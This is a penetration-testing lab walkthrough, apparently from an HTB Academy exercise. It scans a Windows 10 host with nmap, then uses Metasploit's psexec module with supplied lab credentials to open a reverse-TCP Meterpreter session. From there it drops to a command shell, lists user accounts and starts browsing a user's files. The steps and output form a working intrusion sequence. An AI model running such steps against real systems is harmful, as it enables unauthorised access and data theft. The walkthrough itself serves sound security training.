## Automating Payloads & Delivery with Metasploit

1. scan the target with nse and version scanning with nmap.

```
nmap $target_ip -sCV -T5
```

output:
```
PORT     STATE SERVICE      VERSION
7/tcp    open  echo
9/tcp    open  discard?
13/tcp   open  daytime      Microsoft Windows USA daytime
17/tcp   open  qotd         Windows qotd (English)
19/tcp   open  chargen
80/tcp   open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows 10 Pro 18363 microsoft-ds (workgroup: WORKGROUP)
2179/tcp open  vmrdp?
Service Info: Host: SHELLS-WIN10; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 10 Pro 18363 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: Shells-Win10
|   NetBIOS computer name: SHELLS-WIN10\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-10-27T19:24:06-07:00
| smb2-time: 
|   date: 2026-10-28T02:24:03
|_  start_date: N/A
|_clock-skew: mean: 2h19m31s, deviation: 4h02m31s, median: -30s
```

port `80` is open with http trace enabled.

port `445` is open with signing enabled but not required.

2. start metasploit framework console.

```
msfconsole
```

output:
```
       =[ metasploit v6.5.7-dev                                 ]
+ -- --=[ 2,711 exploits - 1,366 auxiliary - 2,616 payloads     ]
+ -- --=[ 437 post - 57 encoders - 14 nops - 13 evasion         ]
msf > 
```

3. search for an smb exploit.

```
msf > search type:exploit smb
```

4. use `exploit(windows/smb/psexec)`.

```
msf > use 201
```

output:
```
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
msf exploit(windows/smb/psexec) > 
```

5. show module options.

```
msf > options
```

6. set required settings.

```
msf exploit(windows/smb/psexec) > set RHOSTS 10.129.201.160
RHOSTS => 10.129.201.160
msf exploit(windows/smb/psexec) > set SMBPass HTB_@cademy_stdnt!
SMBPass => HTB_@cademy_stdnt!
msf exploit(windows/smb/psexec) > set SMBUser htb-student
SMBUser => htb-student
msf exploit(windows/smb/psexec) > set LHOST 10.10.15.176
LHOST => 10.10.15.176
```

7. start the exploit.

```
msf exploit(windows/smb/psexec) > exploit
```

output:
```
[*] Started reverse TCP handler on 10.10.15.176:4444 
[*] 10.129.201.160:445 - Connecting to the server...
[*] 10.129.201.160:445 - Authenticating to 10.129.201.160:445 as user 'htb-student'...
[*] 10.129.201.160:445 - Selecting PowerShell target
[*] 10.129.201.160:445 - Executing the payload...
[+] 10.129.201.160:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (203452 bytes) to 10.129.201.160
[*] Meterpreter session 1 opened (10.10.15.176:4444 -> 10.129.201.160:49874) at 2026-10-27 22:39:22 -0400

meterpreter >
```

8. start a cli.

```
meterpreter > shell
Process 4364 created.
Channel 1 created.
Microsoft Windows [Version 10.0.18363.1854]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

9. list all user accounts on the target machine.

```
C:\Windows\system32>net user
```

output:
```
net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest                    
htb-student              Leo                      WDAGUtilityAccount       
The command completed with one or more errors.
```

10. inspect `htb-student`'s `Documents` folder.

```
C:\Windows\system32>dir C:\Users\htb-student\Documents
```